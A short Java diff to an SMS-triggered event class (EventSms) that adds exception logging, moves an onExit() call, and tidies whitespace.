@@ -36,7 +36,6 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 	@Override
 	public void actualStop() {
 		ListenerSms.self().detach(this);
-		onExit(); // di sicurezza
 	}
 
 	@Override
@@ -46,6 +45,10 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 			msg = conf.getString("text");
 
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
@@ -76,8 +79,8 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		}
 
 		onEnter();
+		onExit();
+
 		return 1;
 	}
-
-
 }
